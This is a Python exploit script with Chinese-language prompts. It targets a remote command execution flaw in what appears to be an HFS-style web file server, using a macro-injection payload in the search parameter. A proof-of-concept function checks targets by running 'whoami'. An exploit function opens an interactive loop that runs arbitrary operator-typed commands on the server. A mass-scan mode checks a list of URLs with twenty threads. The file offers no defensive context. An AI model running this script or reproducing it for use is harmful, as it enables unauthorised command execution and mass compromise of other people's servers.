import requests,sys,argparse,requests_raw,re # type: ignore
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def exp(url):
	# command = input("请输入要执行的命令：")
	# payload = f'GET /?n=%0A&cmd={command}'+'&search=%25xxx%25url%25:%password%}{.exec|{.?cmd.}|timeout=15|out=abc.}{.?n.}{.?n.}RESULT:{.?n.}{.^abc.}===={.?n.} HTTP/1.1\r\nHost: \r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\n\r\n\r\n'
	try:
		res = requests.get(url=url,verify=False,timeout=3)
		if res.status_code ==200:
			while True:
				command = input("请输入要执行的命令：")
				payload = f'GET /?n=%0A&cmd={command}'+'&search=%25xxx%25url%25:%password%}{.exec|{.?cmd.}|timeout=15|out=abc.}{.?n.}{.?n.}RESULT:{.?n.}{.^abc.}===={.?n.} HTTP/1.1\r\nHost: \r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\n\r\n\r\n'	
				res1 = requests_raw.raw(url=url,data=payload,verify=False)
				# print(res1.text)
				if 'RESULT:' in res1.text and '====' in res1.text:
					ree = re.findall(r'RESULT:(.*?)====',res1.text,re.S)
					print(ree[0])
					if command == 'q':
						break
				else:
					print(f"[-]{url}不存在命令执行")
	except:
		# print("站点有问题")
		pass
	
def poc(url):
	payload = 'GET /?n=%0A&cmd=whoami&search=%25xxx%25url%25:%password%}{.exec|{.?cmd.}|timeout=15|out=abc.}{.?n.}{.?n.}RESULT:{.?n.}{.^abc.}===={.?n.} HTTP/1.1\r\nHost: \r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\n\r\n\r\n'
	try:
		res = requests.get(url=url,verify=False)
		if res.status_code ==200:
			res1 = requests_raw.raw(url=url,data=payload,verify=False)
			if 'RESULT:' in res1.text and '====' in res1.text :
				print(f"[+]{url}存在命令执行")
				return True
			else:
				print(f"[-]{url}不存在命令执行")
				return False
		else:
			print("站点有问题")
			return False
	except:
		print("站点有问题")
		
def main():
    par = argparse.ArgumentParser()

    par.add_argument('-u','--url',dest='url',type=str,help='http://www.qqqq.com')
    par.add_argument('-f','--file',dest='file',type=str,help='target.txt')

    args = par.parse_args()

    if args.url and not args.file:
        if poc(args.url):
        	exp(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))

        mp = Pool(20)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"\n\tUage:python {sys.argv[0]} -h")
		
if __name__ == "__main__":
	main()